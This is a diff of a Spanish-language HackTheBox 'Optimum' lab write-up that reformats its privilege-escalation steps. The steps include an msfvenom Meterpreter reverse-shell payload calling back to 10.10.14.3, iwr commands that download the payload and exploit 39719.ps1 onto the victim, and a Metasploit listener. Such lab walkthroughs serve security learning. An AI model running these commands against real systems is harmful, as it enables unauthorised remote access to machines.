@@ -269,31 +269,39 @@ Veo que está llamando al ejecutable cmd.exe, pero eso no nos sirve, debemos mod
 
 Seguimos estos pasos:
 
-> Creación del archivo malicioso con msfvenom
+1. Creación del archivo malicioso con msfvenom
 
-`` msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.3 lport=1234 -f exe -o malicioso.exe ``
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.3 lport=1234 -f exe -o malicioso.exe 
+```
 
-> Subimos el malicioso a la máquina víctima.
+2. Subimos el malicioso a la máquina víctima.
 
 Con el servidor python `` python3 -m http.server 8080 ``
 
-Y en la máquina `` iwr -Uri http://10.10.14.3:8080/malicioso.exe -OutFile C:\Users\kostas\Desktop\malicioso.exe ``
+Y en la máquina:
+```powershell
+iwr -Uri http://10.10.14.3:8080/malicioso.exe -OutFile C:\Users\kostas\Desktop\malicioso.exe
+```
 
-> Editamos el script del exploit:
+3. Editamos el script del exploit:
 
 ![](/assets/images/HTB/Optimum-HackTheBox/exploit3.png)
 
-> Subimos el exploit a la máquina víctima
+4. Subimos el exploit a la máquina víctima
 
 Con el servidor python `` python3 -m http.server 8080 ``
 
-Y en la máquina `` iwr -Uri http://10.10.14.3:8080/39719.ps1 -OutFile C:\Users\kostas\Desktop\39719.ps1 ``
+Y en la máquina
+```powershell
+iwr -Uri http://10.10.14.3:8080/39719.ps1 -OutFile C:\Users\kostas\Desktop\39719.ps1
+```
 
-> Una vez subido nos abrimos metasploit
+5. Una vez subido nos abrimos metasploit
 
 ![](/assets/images/HTB/Optimum-HackTheBox/metasploit1.png)
 
-> Ejecutamos el script 
+6. Ejecutamos el script 
 
 `` Import-Module ./39719.ps1 ``
 
